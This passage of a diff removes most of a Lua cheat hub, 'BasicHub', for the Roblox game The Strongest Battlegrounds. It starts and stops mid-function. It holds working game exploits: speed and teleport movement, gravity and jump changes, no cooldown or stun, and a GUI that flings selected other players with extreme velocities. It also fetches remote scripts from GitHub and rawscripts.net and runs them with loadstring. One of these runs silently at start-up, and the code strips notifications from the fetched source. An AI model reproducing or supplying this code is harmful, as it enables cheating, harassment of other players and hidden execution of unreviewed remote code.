-        local n = Instance.new("Frame", NotifFrame)
-        n.Size             = UDim2.new(1, 0, 0, 56)
-        n.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
-        n.BorderSizePixel  = 0
-        n.BackgroundTransparency = 1
-        Instance.new("UICorner", n).CornerRadius = UDim.new(0, 8)
-        local nS = Instance.new("UIStroke", n)
-        nS.Thickness    = 1
-        nS.Color        = C_ACCENT
-        nS.Transparency = 1
-
-        local ntl = Instance.new("TextLabel", n)
-        ntl.Size                   = UDim2.new(1, -10, 0, 22)
-        ntl.Position               = UDim2.new(0, 8, 0, 4)
-        ntl.BackgroundTransparency = 1
-        ntl.Text                   = ntitle
-        ntl.TextColor3             = C_TEXT
-        ntl.Font                   = Enum.Font.GothamBold
-        ntl.TextSize               = 12
-        ntl.TextXAlignment         = Enum.TextXAlignment.Left
-        ntl.TextTransparency       = 1
-
-        local ncl = Instance.new("TextLabel", n)
-        ncl.Size                   = UDim2.new(1, -10, 0, 22)
-        ncl.Position               = UDim2.new(0, 8, 0, 26)
-        ncl.BackgroundTransparency = 1
-        ncl.Text                   = ncontent
-        ncl.TextColor3             = C_SUB
-        ncl.Font                   = Enum.Font.Gotham
-        ncl.TextSize               = 11
-        ncl.TextXAlignment         = Enum.TextXAlignment.Left
-        ncl.TextWrapped            = true
-        ncl.TextTransparency       = 1
-
-        TweenService:Create(n,   TweenInfo.new(0.3), { BackgroundTransparency = 0 }):Play()
-        TweenService:Create(nS,  TweenInfo.new(0.3), { Transparency = 0 }):Play()
-        TweenService:Create(ntl, TweenInfo.new(0.3), { TextTransparency = 0 }):Play()
-        TweenService:Create(ncl, TweenInfo.new(0.3), { TextTransparency = 0 }):Play()
-
-        task.delay(ndur, function()
-            if not (n and n.Parent) then return end
-            TweenService:Create(n,   TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
-            TweenService:Create(nS,  TweenInfo.new(0.35), { Transparency = 1 }):Play()
-            TweenService:Create(ntl, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
-            TweenService:Create(ncl, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
-            task.delay(0.4, function()
-                if n and n.Parent then n:Destroy() end
-            end)
-        end)
-    end
-
-    return lib
-end
-
-local Rayfield = MakeBasicHubLib()
-
-local Window = Rayfield:CreateWindow({
-    Name = "BasicHub | The Strongest Battlegrounds",
-})
-
--------------------------------------------------------------------------------
--- EMOTEFIX — auto-run silently (no loading GUI, no notifications)
--------------------------------------------------------------------------------
-task.spawn(function()
-    task.wait(3)
-    pcall(function()
-        local src = game:HttpGet(
-            "https://raw.githubusercontent.com/KHATARSISZX/New/refs/heads/main/EmoteStuff/EmoteFix.lua"
-        )
-        -- Remove loading ScreenGui: prevent it being parented to CoreGui
-        src = src:gsub("screen%.Parent%s*=%s*CG", "-- screen suppressed")
-        -- Silence all StarterGui notifications by replacing SG service with a mock
-        src = src:gsub(
-            'local SG%s*=%s*game:GetService%("StarterGui"%)',
-            'local SG = setmetatable({},{__index=function()return function()end end})'
-        )
-        loadstring(src)()
-    end)
-end)
-
-
-
--------------------------------------------------------------------------------
--- SPEED / TELEPORT STATE
--------------------------------------------------------------------------------
-local tspeed   = 0.1
-local tpwalking = false
-
-RunService.Heartbeat:Connect(function()
-    if tpwalking and character and humanoid and humanoidRootPart then
-        if humanoid.MoveDirection.Magnitude > 0 then
-            humanoidRootPart.CFrame = humanoidRootPart.CFrame
-                + (humanoid.MoveDirection * tspeed)
-        end
-    end
-end)
-
--------------------------------------------------------------------------------
--- FLING LOGIC  (SkidFling from K1LAS1K's Multi-Target Fling)
--------------------------------------------------------------------------------
-local BH_OldPos   = nil
-local BH_FPDH     = workspace.FallenPartsDestroyHeight
-local FlingActive = false
-
-local function SkidFling(TargetPlayer)
-    local Char     = LocalPlayer.Character
-    local Hum      = Char and Char:FindFirstChildOfClass("Humanoid")
-    local RootPart = Hum and Hum.RootPart
-    if not (Char and Hum and RootPart) then return end
-
-    local TChar    = TargetPlayer.Character
-    if not TChar then return end
-
-    local THum     = TChar:FindFirstChildOfClass("Humanoid")
-    local TRoot    = THum and THum.RootPart
-    local THead    = TChar:FindFirstChild("Head")
-    local Acc      = TChar:FindFirstChildOfClass("Accessory")
-    local Handle   = Acc and Acc:FindFirstChild("Handle")
-
-    if RootPart.Velocity.Magnitude < 50 then
-        BH_OldPos = RootPart.CFrame
-    end
-
-    if THum and THum.Sit then return end
-
-    -- Camera follow target
-    if THead then
-        workspace.CurrentCamera.CameraSubject = THead
-    elseif Handle then
-        workspace.CurrentCamera.CameraSubject = Handle
-    elseif THum and TRoot then
-        workspace.CurrentCamera.CameraSubject = THum
-    end
-
-    if not TChar:FindFirstChildWhichIsA("BasePart") then return end
-
-    local function FPos(BasePart, Pos, Ang)
-        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
-        Char:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
-        RootPart.Velocity    = Vector3.new(9e7, 9e7 * 10, 9e7)
-        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
-    end
-
-    local function SFBasePart(BasePart)
-        local TimeToWait = 2
-        local Time       = tick()
-        local Angle      = 0
-        repeat
-            if RootPart and THum then
-                if BasePart.Velocity.Magnitude < 50 then
-                    Angle = Angle + 100
-                    FPos(BasePart, CFrame.new(0,1.5,0) + THum.MoveDirection * BasePart.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(Angle),0,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0,-1.5,0) + THum.MoveDirection * BasePart.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(Angle),0,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0,1.5,0) + THum.MoveDirection, CFrame.Angles(math.rad(Angle),0,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0,-1.5,0) + THum.MoveDirection, CFrame.Angles(math.rad(Angle),0,0))
-                    task.wait()
-                else
-                    FPos(BasePart, CFrame.new(0,1.5,THum.WalkSpeed),  CFrame.Angles(math.rad(90),0,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0,-1.5,-THum.WalkSpeed),CFrame.Angles(0,0,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0,1.5,THum.WalkSpeed),  CFrame.Angles(math.rad(90),0,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0,-1.5,0), CFrame.Angles(math.rad(90),0,0))
-                    task.wait()
-                    FPos(BasePart, CFrame.new(0,-1.5,0), CFrame.Angles(0,0,0))
-                    task.wait()
-                end
-            end
-        until Time + TimeToWait < tick() or not FlingActive
-    end
-
-    workspace.FallenPartsDestroyHeight = 0/0
-
-    local BV = Instance.new("BodyVelocity")
-    BV.Parent   = RootPart
-    BV.Velocity  = Vector3.new(0,0,0)
-    BV.MaxForce  = Vector3.new(9e9,9e9,9e9)
-
-    Hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-
-    if     TRoot  then SFBasePart(TRoot)
-    elseif THead  then SFBasePart(THead)
-    elseif Handle then SFBasePart(Handle)
-    end
-
-    BV:Destroy()
-    Hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-    workspace.CurrentCamera.CameraSubject = Hum
-
-    if BH_OldPos then
-        repeat
-            RootPart.CFrame = BH_OldPos * CFrame.new(0,.5,0)
-            Char:SetPrimaryPartCFrame(BH_OldPos * CFrame.new(0,.5,0))
-            Hum:ChangeState("GettingUp")
-            for _, part in pairs(Char:GetChildren()) do
-                if part:IsA("BasePart") then
-                    part.Velocity = Vector3.new()
-                    part.RotVelocity = Vector3.new()
-                end
-            end
-            task.wait()
-        until (RootPart.Position - BH_OldPos.p).Magnitude < 25
-        workspace.FallenPartsDestroyHeight = BH_FPDH
-    end
-end
-
--------------------------------------------------------------------------------
--- FLING GUI  (separate draggable ScreenGui, opened from Rayfield button)
--------------------------------------------------------------------------------
-local FlingSelectedTargets = {}
-local FlingPlayerCheckboxes = {}
-local FlingThread = nil
-local FlingGui = nil
-
-local function CreateFlingGUI()
-    -- Destroy old GUI if exists
-    if FlingGui and FlingGui.Parent then FlingGui:Destroy() end
-
-    local coreGui = game:GetService("CoreGui")
-    local parent  = pcall(function() return coreGui end) and coreGui or LocalPlayer:WaitForChild("PlayerGui")
-
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name           = "BH_FlingGUI"
-    ScreenGui.ResetOnSpawn   = false
-    ScreenGui.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
-    pcall(function() ScreenGui.Parent = coreGui end)
-    if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
-
-    FlingGui = ScreenGui
-
-    -- Main frame
-    local Main = Instance.new("Frame", ScreenGui)
-    Main.Size              = UDim2.new(0, 320, 0, 400)
-    Main.Position          = UDim2.new(0.5, -160, 0.5, -200)
-    Main.BackgroundColor3  = Color3.fromRGB(18, 18, 18)
-    Main.BorderSizePixel   = 0
-    Main.Active            = true
-    Main.Draggable         = true
-    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
-
-    local Stroke = Instance.new("UIStroke", Main)
-    Stroke.Thickness = 2
-    Stroke.Color     = Color3.fromRGB(220, 50, 50)
-
-    -- Title bar
-    local TitleBar = Instance.new("Frame", Main)
-    TitleBar.Size             = UDim2.new(1, 0, 0, 36)
-    TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    TitleBar.BorderSizePixel  = 0
-    Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 12)
-
-    local TitleLabel = Instance.new("TextLabel", TitleBar)
-    TitleLabel.Size              = UDim2.new(1, -40, 1, 0)
-    TitleLabel.Position          = UDim2.new(0, 10, 0, 0)
-    TitleLabel.BackgroundTransparency = 1
-    TitleLabel.Text              = "⚔ BasicHub | Fling"
-    TitleLabel.TextColor3        = Color3.fromRGB(220, 50, 50)
-    TitleLabel.Font              = Enum.Font.GothamBold
-    TitleLabel.TextSize          = 15
-    TitleLabel.TextXAlignment    = Enum.TextXAlignment.Left
-
-    local CloseBtn = Instance.new("TextButton", TitleBar)
-    CloseBtn.Size              = UDim2.new(0, 28, 0, 28)
-    CloseBtn.Position          = UDim2.new(1, -32, 0, 4)
-    CloseBtn.BackgroundColor3  = Color3.fromRGB(200, 40, 40)
-    CloseBtn.Text              = "✕"
-    CloseBtn.TextColor3        = Color3.fromRGB(255,255,255)
-    CloseBtn.Font              = Enum.Font.GothamBold
-    CloseBtn.TextSize          = 14
-    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
-
-    -- Status label
-    local StatusLabel = Instance.new("TextLabel", Main)
-    StatusLabel.Size              = UDim2.new(1, -20, 0, 24)
-    StatusLabel.Position          = UDim2.new(0, 10, 0, 42)
-    StatusLabel.BackgroundTransparency = 1
-    StatusLabel.Text              = "Select targets to fling"
-    StatusLabel.TextColor3        = Color3.fromRGB(200, 200, 200)
-    StatusLabel.Font              = Enum.Font.Gotham
-    StatusLabel.TextSize          = 13
-    StatusLabel.TextXAlignment    = Enum.TextXAlignment.Left
-
-    -- Player list frame
-    local ListOuter = Instance.new("Frame", Main)
-    ListOuter.Size             = UDim2.new(1, -20, 0, 220)
-    ListOuter.Position         = UDim2.new(0, 10, 0, 70)
-    ListOuter.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
-    ListOuter.BorderSizePixel  = 0
-    Instance.new("UICorner", ListOuter).CornerRadius = UDim.new(0, 8)
-
-    local Scroll = Instance.new("ScrollingFrame", ListOuter)
-    Scroll.Size                = UDim2.new(1, -8, 1, -8)
-    Scroll.Position            = UDim2.new(0, 4, 0, 4)
-    Scroll.BackgroundTransparency = 1
-    Scroll.BorderSizePixel     = 0
-    Scroll.ScrollBarThickness  = 5
-    Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-    local ListLayout = Instance.new("UIListLayout", Scroll)
-    ListLayout.Padding = UDim.new(0, 4)
-    ListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-        Scroll.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 8)
-    end)
-
-    -- Count selected
-    local function CountSelected()
-        local n = 0
-        for _ in pairs(FlingSelectedTargets) do n = n + 1 end
-        return n
-    end
-
-    -- Update status text
-    local function UpdateStatus()
-        local n = CountSelected()
-        if FlingActive then
-            StatusLabel.Text      = "⚔ Flinging " .. n .. " player(s)..."
-            StatusLabel.TextColor3 = Color3.fromRGB(255,80,80)
-        else
-            StatusLabel.Text      = n .. " selected | Press START"
-            StatusLabel.TextColor3 = Color3.fromRGB(200,200,200)
-        end
-    end
-
-    -- Build player rows
-    local function BuildPlayerList()
-        for _, child in pairs(Scroll:GetChildren()) do
-            if child:IsA("Frame") then child:Destroy() end
-        end
-        FlingPlayerCheckboxes = {}
-
-        local allPlayers = Players:GetPlayers()
-        table.sort(allPlayers, function(a,b) return a.Name:lower() < b.Name:lower() end)
-
-        for _, plr in ipairs(allPlayers) do
-            if plr ~= LocalPlayer then
-
-            local Row = Instance.new("Frame", Scroll)
-            Row.Size              = UDim2.new(1, 0, 0, 32)
-            Row.BackgroundColor3  = Color3.fromRGB(34, 34, 34)
-            Row.BorderSizePixel   = 0
-            Instance.new("UICorner", Row).CornerRadius = UDim.new(0, 6)
-
-            -- Checkbox
-            local CB = Instance.new("Frame", Row)
-            CB.Size             = UDim2.new(0, 20, 0, 20)
-            CB.Position         = UDim2.new(0, 6, 0.5, -10)
-            CB.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-            CB.BorderSizePixel  = 0
-            Instance.new("UICorner", CB).CornerRadius = UDim.new(0, 4)
-
-            local Check = Instance.new("TextLabel", CB)
-            Check.Size                = UDim2.fromScale(1,1)
-            Check.BackgroundTransparency = 1
-            Check.Text               = "✓"
-            Check.TextColor3         = Color3.fromRGB(80, 255, 80)
-            Check.Font               = Enum.Font.GothamBold
-            Check.TextSize           = 14
-            Check.Visible            = FlingSelectedTargets[plr.Name] ~= nil
-
-            -- Player name
-            local NameLabel = Instance.new("TextLabel", Row)
-            NameLabel.Size             = UDim2.new(1, -40, 1, 0)
-            NameLabel.Position         = UDim2.new(0, 34, 0, 0)
-            NameLabel.BackgroundTransparency = 1
-            NameLabel.Text             = plr.Name
-            NameLabel.TextColor3       = Color3.fromRGB(240, 240, 240)
-            NameLabel.Font             = Enum.Font.Gotham
-            NameLabel.TextSize         = 13
-            NameLabel.TextXAlignment   = Enum.TextXAlignment.Left
-
-            -- Clickable overlay
-            local ClickBtn = Instance.new("TextButton", Row)
-            ClickBtn.Size              = UDim2.fromScale(1,1)
-            ClickBtn.BackgroundTransparency = 1
-            ClickBtn.Text              = ""
-            ClickBtn.ZIndex            = 5
-
-            ClickBtn.MouseButton1Click:Connect(function()
-                if FlingSelectedTargets[plr.Name] then
-                    FlingSelectedTargets[plr.Name] = nil
-                    Check.Visible = false
-                    CB.BackgroundColor3 = Color3.fromRGB(50,50,50)
-                else
-                    FlingSelectedTargets[plr.Name] = plr
-                    Check.Visible = true
-                    CB.BackgroundColor3 = Color3.fromRGB(30,80,30)
-                end
-                UpdateStatus()
-            end)
-
-            -- Hover effect
-            ClickBtn.MouseEnter:Connect(function()
-                Row.BackgroundColor3 = Color3.fromRGB(44,44,44)
-            end)
-            ClickBtn.MouseLeave:Connect(function()
-                Row.BackgroundColor3 = Color3.fromRGB(34,34,34)
-            end)
-
-            FlingPlayerCheckboxes[plr.Name] = { Row=Row, Check=Check, CB=CB }
-            end -- if plr ~= LocalPlayer
-        end -- for
-        UpdateStatus()
-    end
-
-    -- ── Buttons row ─────────────────────────────────────────────────────────
-    local BtnY = 298
-
-    local function MakeBtn(text, color, xScale, xOffset, wScale, wOffset)
-        local btn = Instance.new("TextButton", Main)
-        btn.Size             = UDim2.new(wScale, wOffset, 0, 36)
-        btn.Position         = UDim2.new(xScale, xOffset, 0, BtnY)
-        btn.BackgroundColor3 = color
-        btn.Text             = text
-        btn.TextColor3       = Color3.fromRGB(255,255,255)
-        btn.Font             = Enum.Font.GothamBold
-        btn.TextSize         = 13
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-        return btn
-    end
-
-    local StartBtn    = MakeBtn("▶ START",  Color3.fromRGB(0,160,0),   0,10,  0.5,-15)
-    local StopBtn     = MakeBtn("■ STOP",   Color3.fromRGB(180,0,0),   0.5,5, 0.5,-15)
-    local SelAllBtn   = MakeBtn("✔ All",    Color3.fromRGB(60,60,60),  0,10,  0.5,-15)
-    local DeselAllBtn = MakeBtn("✘ None",  Color3.fromRGB(60,60,60),  0.5,5, 0.5,-15)
-    SelAllBtn.Position   = UDim2.new(0,10,0,BtnY+44)
-    DeselAllBtn.Position = UDim2.new(0.5,5,0,BtnY+44)
-
-    -- ── Logic ────────────────────────────────────────────────────────────────
-    local function StartFling()
-        if FlingActive then return end
-        if CountSelected() == 0 then
-            StatusLabel.Text = "Select at least one target!"
-            task.wait(1.5)
-            UpdateStatus()
-            return
-        end
-        FlingActive = true
-        UpdateStatus()
-        FlingThread = task.spawn(function()
-            while FlingActive do
-                for name, plr in pairs(FlingSelectedTargets) do
-                    if not (plr and plr.Parent) then
-                        FlingSelectedTargets[name] = nil
-                        local cb = FlingPlayerCheckboxes[name]
-                        if cb then cb.Check.Visible = false; cb.CB.BackgroundColor3 = Color3.fromRGB(50,50,50) end
-                    elseif FlingActive then
-                        pcall(SkidFling, plr)
-                        task.wait(0.1)
-                    end
-                end
-                UpdateStatus()
-                task.wait(0.5)
-            end
-        end)
-    end
-
-    local function StopFling()
-        if not FlingActive then return end
-        FlingActive = false
-        FlingThread = nil
-        workspace.FallenPartsDestroyHeight = BH_FPDH
-        UpdateStatus()
-    end
-
-    StartBtn.MouseButton1Click:Connect(StartFling)
-    StopBtn.MouseButton1Click:Connect(StopFling)
-
-    SelAllBtn.MouseButton1Click:Connect(function()
-        for _, plr in ipairs(Players:GetPlayers()) do
-            if plr ~= LocalPlayer then
-                FlingSelectedTargets[plr.Name] = plr
-                local cb = FlingPlayerCheckboxes[plr.Name]
-                if cb then cb.Check.Visible = true; cb.CB.BackgroundColor3 = Color3.fromRGB(30,80,30) end
-            end
-        end
-        UpdateStatus()
-    end)
-
-    DeselAllBtn.MouseButton1Click:Connect(function()
-        FlingSelectedTargets = {}
-        for _, cb in pairs(FlingPlayerCheckboxes) do
-            cb.Check.Visible = false
-            cb.CB.BackgroundColor3 = Color3.fromRGB(50,50,50)
-        end
-        UpdateStatus()
-    end)
-
-    CloseBtn.MouseButton1Click:Connect(function()
-        StopFling()
-        ScreenGui:Destroy()
-        FlingGui = nil
-    end)
-
-    -- ── Dynamic player list ──────────────────────────────────────────────────
-    Players.PlayerAdded:Connect(function(plr)
-        if ScreenGui and ScreenGui.Parent then
-            BuildPlayerList()
-        end
-    end)
-    Players.PlayerRemoving:Connect(function(plr)
-        FlingSelectedTargets[plr.Name] = nil
-        if ScreenGui and ScreenGui.Parent then
-            BuildPlayerList()
-        end
-        UpdateStatus()
-    end)
-
-    BuildPlayerList()
-end
-
--------------------------------------------------------------------------------
--- ═══ TAB: MAIN ═══
--------------------------------------------------------------------------------
-local mainTab = Window:CreateTab("⚔️ Main", "sword")
-
-mainTab:CreateSection("Movement")
-
-mainTab:CreateToggle({
-    Name="Speed Boost", CurrentValue=false, Flag="SpeedBoost",
-    Callback=function(v) tpwalking = v end,
-})
--- Speed Multiplier: type value 0–5  (replaces slider — no broken min-value look)
-mainTab:CreateInput({
-    Name="Speed Multiplier  (0 – 5)",
-    PlaceholderText="Default: 0.1",
-    Flag="SpeedInput",
-    RemoveTextAfterFocusLost=false,
-    Callback=function(v)
-        local n = tonumber(v)
-        if n then tspeed = math.clamp(n, 0, 5) end
-    end,
-})
-
-mainTab:CreateDivider()
-
-mainTab:CreateToggle({
-    Name="Jump Boost", CurrentValue=false, Flag="JumpBoost",
-    Callback=function(v)
-        if humanoid then humanoid.UseJumpPower = not v end
-    end,
-})
--- Jump Height: type value 7.2–500
-mainTab:CreateInput({
-    Name="Jump Height  (7.2 – 500)",
-    PlaceholderText="Default: 7.2",
-    Flag="JumpInput",
-    RemoveTextAfterFocusLost=false,
-    Callback=function(v)
-        local n = tonumber(v)
-        if n and humanoid then humanoid.JumpHeight = math.clamp(n, 0, 500) end
-    end,
-})
-
-mainTab:CreateDivider()
-
--- Gravity: type value 0–300  (default 192.6 = normal)
-mainTab:CreateInput({
-    Name="Gravity  (0 – 300, default 192.6)",
-    PlaceholderText="Default: 192.6",
-    Flag="GravityInput",
-    RemoveTextAfterFocusLost=false,
-    Callback=function(v)
-        local n = tonumber(v)
-        if n then workspace.Gravity = math.clamp(n, 0, 300) end
-    end,
-})
-
--- FOV: type value 10–120  (default 70)
-mainTab:CreateInput({
-    Name="FOV  (10 – 120)",
-    PlaceholderText="Default: 70",
-    Flag="FOVInput",
-    RemoveTextAfterFocusLost=false,
-    Callback=function(v)
-        local n = tonumber(v)
-        if n and workspace.CurrentCamera then
-            workspace.CurrentCamera.FieldOfView = math.clamp(n, 10, 120)
-        end
-    end,
-})
-
-mainTab:CreateDivider()
-mainTab:CreateSection("Exploits")
-
-mainTab:CreateToggle({
-    Name="No Dash Cooldown", CurrentValue=false, Flag="NoDashCooldown",
-    Callback=function(v)
-        pcall(function() workspace:SetAttribute("NoDashCooldown", v) end)
-    end,
-})
-
-local noDashEndlagEnabled = false
-mainTab:CreateToggle({
-    Name="No Dash Endlag", CurrentValue=false, Flag="NoDashEndlag",
-    Callback=function(v)
-        noDashEndlagEnabled = v
-    end,
-})
-
--- No Dash Endlag logic: on Q press, stop long animation tracks after ~0.3s
-UserInputService.InputBegan:Connect(function(inp, gp)
-    if gp or not noDashEndlagEnabled then return end
-    if inp.KeyCode == Enum.KeyCode.Q then
-        task.delay(0.3, function()
-            if not noDashEndlagEnabled then return end
-            local char = LocalPlayer.Character
-            if not char then return end
-            local hum = char:FindFirstChildOfClass("Humanoid")
-            if not hum then return end
-            pcall(function()
-                for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
-                    if track.Length and track.Length > 0.45 then
-                        track:Stop(0.08)
-                    end
-                end
-            end)
-        end)
-    end
-end)
-
-mainTab:CreateToggle({
-    Name="No Fatigue", CurrentValue=false, Flag="NoFatigue",
-    Callback=function(v)
-        pcall(function() workspace:SetAttribute("NoFatigue", v) end)
-    end,
-})
-mainTab:CreateLabel("⚠ No Fatigue: Update needed.")
-
-mainTab:CreateDivider()
-mainTab:CreateSection("Emotes")
-
-mainTab:CreateToggle({
-    Name="Extra Emote Slots", CurrentValue=false, Flag="EmoteExtraSlots",
-    Callback=function(v)
-        pcall(function() LocalPlayer:SetAttribute("ExtraSlots", v) end)
-    end,
-})
-mainTab:CreateToggle({
-    Name="Emote Search Bar", CurrentValue=false, Flag="EmoteSearchBar",
-    Callback=function(v)
-        pcall(function() LocalPlayer:SetAttribute("EmoteSearchBar", v) end)
-    end,
-})
-
-mainTab:CreateDivider()
-mainTab:CreateSection("Combat")
-
--- No Stun: reactive via GetPropertyChangedSignal — fires the instant TSB changes the value
-local noStunEnabled  = false
-local noStunSpd      = 16
-local noStunConns    = {}
-local noStunCharConn = nil
-
-local function disconnectNoStun()
-    for i = 1, #noStunConns do
-        noStunConns[i]:Disconnect()
-    end
-    noStunConns = {}
-end
-
-local function applyNoStun(char)
-    disconnectNoStun()
-    if not noStunEnabled or not char then return end
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hum then return end
-
-    -- Set values immediately on connect
-    pcall(function() hum.WalkSpeed     = noStunSpd end)
-    pcall(function() hum.PlatformStand = false      end)
-
-    -- WalkSpeed: the moment TSB changes it → instantly restore
-    noStunConns[#noStunConns + 1] = hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
-        pcall(function()
-            if hum.WalkSpeed ~= noStunSpd then
-                hum.WalkSpeed = noStunSpd
-            end
-        end)
-    end)
-
-    -- PlatformStand: the moment TSB sets it true → instantly false
-    noStunConns[#noStunConns + 1] = hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
-        pcall(function()
-            if hum.PlatformStand then hum.PlatformStand = false end
-        end)
-    end)
-
-    -- HumanoidRootPart velocity: the moment a large knockback is applied → zero horizontal
-    if hrp then
-        noStunConns[#noStunConns + 1] = hrp:GetPropertyChangedSignal("AssemblyLinearVelocity"):Connect(function()
-            pcall(function()
-                local vel  = hrp.AssemblyLinearVelocity
-                local hMag = Vector3.new(vel.X, 0, vel.Z).Magnitude
-                if hMag > 25 then
-                    hrp.AssemblyLinearVelocity = Vector3.new(0, vel.Y, 0)
-                end
-            end)
-        end)
-    end
-end
-
-mainTab:CreateToggle({
-    Name="No Stun", CurrentValue=false, Flag="NoStun",
-    Callback=function(v)
-        noStunEnabled = v
-        if v then
-            local char = LocalPlayer.Character
-            local hum  = char and char:FindFirstChildOfClass("Humanoid")
-            noStunSpd = (hum and hum.WalkSpeed > 2) and hum.WalkSpeed or 16
-            applyNoStun(char)
-            noStunCharConn = LocalPlayer.CharacterAdded:Connect(function(newChar)
-                task.wait(0.5)
-                noStunSpd = 16
-                applyNoStun(newChar)
-            end)
-        else
-            disconnectNoStun()
-            if noStunCharConn then noStunCharConn:Disconnect(); noStunCharConn = nil end
-        end
-    end,
-})
-mainTab:CreateLabel("⚠ Beta: Set speed boost for better work.")
-
-mainTab:CreateDivider()
-mainTab:CreateSection("Wall Combo")
-mainTab:CreateLabel("Press button to load Wall Combo script (auto-detect walls, auto-combo).")
-
-local wallComboLoaded = false
-mainTab:CreateButton({
-    Name = "Load Wall Combo",
-    Callback = function()
-        if wallComboLoaded then
-            Rayfield:Notify({ Title="Wall Combo", Content="Already loaded!", Duration=2, Image=4483362458 })
-            return
-        end
-        wallComboLoaded = true
-        task.spawn(function()
-            pcall(function()
-                local src = game:HttpGet(
-                    "https://rawscripts.net/raw/The-Strongest-Battlegrounds-KEYLESS-TSB-Wall-Combo-Anywhere-and-Auto-Wall-Combo-98317"
-                )
-                -- Silence all StarterGui SetCore notifications
-                src = src:gsub(
-                    'game:GetService%("StarterGui"%)',
-                    'setmetatable({},{__index=function()return function()end end})'
-                )
-                src = src:gsub('StarterGui:SetCore%b()', '')
-                -- Silence prints
-                src = src:gsub('print%b()', '')
-                loadstring(src)()
-            end)
-        end)
-    end,
-})
-
--------------------------------------------------------------------------------
--- ═══ TAB: FLING ═══
--------------------------------------------------------------------------------
-local flingTab = Window:CreateTab("💥 Fling", "zap")
-
-flingTab:CreateSection("Multi-Target Fling")
-
-flingTab:CreateButton({
-    Name = "⚔ Open Fling GUI",
-    Callback = function()
-        if FlingGui and FlingGui.Parent then
-            FlingGui:Destroy()
-            FlingGui = nil
-        else
-            CreateFlingGUI()
-            Rayfield:Notify({
-                Title   = "Fling GUI",
-                Content = "Window opened! Select targets.",
-                Duration = 2,
-                Image   = 4483362458,
-            })
-        end
-    end,
-})
-
-flingTab:CreateDivider()
-flingTab:CreateSection("Anti-Fling")
-
-local AntiFlingActive = false
-local AntiFlingConn   = nil
-
-local function applyAntiFling()
-    if humanoid then
-        pcall(function() humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false) end)
-    end
-    AntiFlingConn = RunService.Heartbeat:Connect(function()
-        local char = LocalPlayer.Character
-        if not char then return end
-        for _, part in ipairs(workspace:GetDescendants()) do
-            if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(char) then
-                if part.AssemblyLinearVelocity.Magnitude > 3
-                or part.AssemblyAngularVelocity.Magnitude > 3 then
-                    part.CanCollide = false
-                end
-            end
-        end
-    end)
-end
-
-local function removeAntiFling()
-    if AntiFlingConn then AntiFlingConn:Disconnect(); AntiFlingConn = nil end
-    if humanoid then
-        pcall(function() humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true) end)
-    end
-end
-
-flingTab:CreateToggle({
-    Name = "Anti-Fling",
-    CurrentValue = false,
-    Flag = "AntiFling",
-    Callback = function(v)
-        AntiFlingActive = v
-        if v then
-            applyAntiFling()
-        else
-            removeAntiFling()
-        end
-    end,
-})
-
--- Re-apply on respawn
-LocalPlayer.CharacterAdded:Connect(function()
-    if AntiFlingActive then
-        task.wait(1)
-        applyAntiFling()
-    end
-end)
-
--------------------------------------------------------------------------------
--- ═══ TAB: MOVESETS ═══
--------------------------------------------------------------------------------
-local movesetTab = Window:CreateTab("🥊 Movesets", "activity")
-
-movesetTab:CreateSection("Jujutsu Kaisen")
-
--- ── GOJO SATORU ──────────────────────────────────────────────────────────────
-local function runGojoMoveset()
-    task.spawn(function()
-        local plr  = game.Players.LocalPlayer
-        repeat task.wait() until plr.Character
-        local char = plr.Character or plr.CharacterAdded:Wait()
-        local hum  = char:WaitForChild("Humanoid")
-        local pGui = plr.PlayerGui
-
-        -- Hotbar labels
-        pcall(function()
-            local hotbar = pGui:FindFirstChild("Hotbar")
-            local bp     = hotbar and hotbar:FindFirstChild("Backpack")
-            local hf     = bp and bp:FindFirstChild("Hotbar")
-            if hf then
-                local names = {"Reversal Red","Barrage Attack","Strong Punch","Justice throw"}
-                for i, n in ipairs(names) do
-                    pcall(function() hf:FindFirstChild(tostring(i)).Base.ToolName.Text = n end)
-                end
-            end
-        end)
-
-        -- MagicHealth label
-        pcall(function()
-            local sg = pGui:FindFirstChild("ScreenGui")
-            local mh = sg and sg:FindFirstChild("MagicHealth")
-            local tl = mh and mh:FindFirstChild("TextLabel")
-            if tl then tl.Text = "Let's Get Crazy" end
-        end)
-        pGui.DescendantAdded:Connect(function()
-            pcall(function()
-                local sg = pGui:FindFirstChild("ScreenGui")
-                local mh = sg and sg:FindFirstChild("MagicHealth")
